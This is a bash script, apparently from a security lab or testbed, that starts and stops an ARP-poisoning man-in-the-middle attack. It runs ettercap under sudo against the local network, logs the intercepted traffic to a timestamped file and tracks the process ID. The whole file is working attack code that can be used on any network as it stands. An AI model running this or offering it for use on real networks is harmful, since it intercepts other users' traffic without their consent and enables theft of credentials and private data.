#!/bin/bash

# File configuration
LOG_DIR="../logfiles/mitmlogs"
LOG_FILE="$LOG_DIR/mitm_log_$(date +%s).log"
PID_FILE="$LOG_DIR/mitm.pid"

ONOFF=$1 # Input variable that determines "on" or "off" status for attack

# Ensure log directory exists
mkdir -p "$LOG_DIR"

# Determine whether to turn MITM attack on or off
if [[ "$ONOFF" == "On" ]]; then
    # Check if already running
    if [ -f "$PID_FILE" ]; then
        echo "MITM attack is already running. Stop it first."
        exit 1
    fi

    # Start Ettercap in quiet mode and pipe output to logfile
    sudo stdbuf -oL ettercap -T -q -M arp > "$LOG_FILE" 2>&1 & # Redirects both standard output and errors to the log file.
    MITM_PID=$!

    # Save PID and log path to PID_FILE
    echo "$MITM_PID" > "$PID_FILE"
    echo "$LOG_FILE" >> "$PID_FILE"
    echo "MITM attack started with PID: $MITM_PID"

elif [[ "$ONOFF" == "Off" ]]; then
    if [ -f "$PID_FILE" ]; then
        MITM_PID=$(head -n 1 "$PID_FILE")
        LOG_FILE=$(tail -n 1 "$PID_FILE")

        # Stop ettercap
        if kill -0 "$MITM_PID" 2>/dev/null; then
            sudo kill "$MITM_PID"
            echo "MITM attack stopped."
            echo "Log created at: $LOG_FILE"
        else
            echo "Process $MITM_PID not found."
        fi

        # Cleanup PID file
        rm -f "$PID_FILE"
    else
        echo "No active MITM attack to stop."
    fi

else
    echo "Invalid argument. Use 'On' or 'Off'."
    exit 1
fi

exit 0